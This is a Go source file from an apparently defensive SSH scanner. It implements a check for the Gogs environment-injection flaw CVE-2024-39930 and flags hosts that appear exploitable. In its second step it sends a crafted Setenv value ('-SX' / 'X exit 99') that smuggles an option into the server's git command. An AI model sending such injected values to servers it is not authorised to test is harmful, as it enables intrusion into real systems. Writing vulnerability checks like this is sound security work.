package cmd

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnGogsEnv = "vuln-gogs-env"

func sshCheckVulnGogsEnv(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnGogsEnv
	if !conf.IsCheckEnabled(tname) {
		conf.Logger.Debugf("%s %s is not enabled", addr, tname)
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	if root.SessionAuth == nil {
		conf.Logger.Errorf("%s %s is missing cached session auth, skipping", addr, tname)
		return nil
	}

	gitUploadPack := "git-upload-pack '/user/repo.git'"

	//
	// Send an invalid repo path to Gogs to elicit a reply after safe Setenv call
	//
	baseGogs := func(c net.Conn, _ *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		c.SetDeadline(time.Now().Add(time.Second * 15))

		// Request a pty and don't ask for a reply, this helps with the next call
		if err := ses.RequestPtyNoReply("xterm", 20, 80, ssh.TerminalModes{ssh.ECHO: 0}); err != nil {
			conf.Logger.Errorf("%s %s pty request failed: %v", addr, tname, err)
		}

		stdOut, stdErr, stdIn, err := sessionGetSTDIO(ses)
		if err != nil {
			conf.Logger.Errorf("%s %s failed to get session stdio: %v", addr, tname, err)
			return err
		}

		_ = ses.SetenvNoReply("HELLO", "WORLD")
		err = ses.Run(gitUploadPack)

		time.Sleep(time.Second)
		stdIn.Close()

		outp := stdOut.Dump()
		outp = append(outp, stdErr.Dump()...)
		res.SessionOutput = auth.CleanSessionOutput(outp)
		return err
	}
	baseRes := auth.SSHAuth(addr, options.WithSessionHandler(baseGogs), auth.SSHAuthHandlerSingle(root.SessionAuth))
	// Failed to open session
	if baseRes.Stage != "session" {
		conf.Logger.Errorf("%s %s failed to re-open session using %s: %v", addr, tname, root.SessionMethod, baseRes.Error)
		return baseRes
	}
	// Not a Gogs response
	if !strings.Contains(baseRes.SessionOutput, "Gogs:") {
		conf.Logger.Errorf("%s %s expected 'Gogs:' and received '%s'", addr, tname, baseRes.SessionOutput)
		return baseRes
	}
	conf.Logger.Infof("%s %s Gogs identified via response '%s'", addr, tname, baseRes.SessionOutput)

	//
	// Run this sequence again, but force an error in the Setenv call that closes the channel
	//
	expGogs := func(c net.Conn, _ *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		c.SetDeadline(time.Now().Add(time.Second * 15))

		stdOut, stdErr, stdIn, err := sessionGetSTDIO(ses)
		if err != nil {
			conf.Logger.Errorf("%s %s failed to get session stdio: %v", addr, tname, err)
			return err
		}

		// Request a pty and don't ask for a reply, this helps with the next call to Shell()
		if err := ses.RequestPtyNoReply("xterm", 20, 80, ssh.TerminalModes{ssh.ECHO: 0}); err != nil {
			conf.Logger.Errorf("%s %s pty request failed: %v", addr, tname, err)
		}

		_ = ses.SetenvNoReply("-SX", "X exit 99")

		err = ses.Run(gitUploadPack)

		time.Sleep(time.Second)
		stdIn.Close()

		outp := stdOut.Dump()
		outp = append(outp, stdErr.Dump()...)
		res.SessionOutput = auth.CleanSessionOutput(outp)

		return err
	}
	expRes := auth.SSHAuth(addr, options.WithSessionHandler(expGogs), auth.SSHAuthHandlerSingle(root.SessionAuth))
	// Failed to open session
	if expRes.Stage != "session" {
		conf.Logger.Errorf("%s %s failed to re-open session using %s: %v", addr, tname, root.SessionMethod, expRes.Error)
		return expRes
	}
	if strings.Contains(expRes.SessionOutput, "Gogs:") {
		conf.Logger.Infof("%s %s Gogs does not seem exploitable: (out=%s, err=%s)", addr, tname, expRes.SessionOutput, expRes.Error)
		return expRes
	}

	conf.Logger.Warnf("%s %s Gogs appears to be exploitable: (out=%s, err=%s)", addr, tname, expRes.SessionOutput, expRes.Error)

	root.AddVuln(auth.VulnResult{
		ID:  checkVulnGogsEnv,
		Ref: "CVE-2024-39930",
		URL: "https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1/",
		Proof: fmt.Sprintf("vulnerable (%s/%s) vs normal (%s/%s)",
			expRes.Error, expRes.SessionOutput,
			baseRes.Error, baseRes.SessionOutput,
		),
	})

	return expRes
}
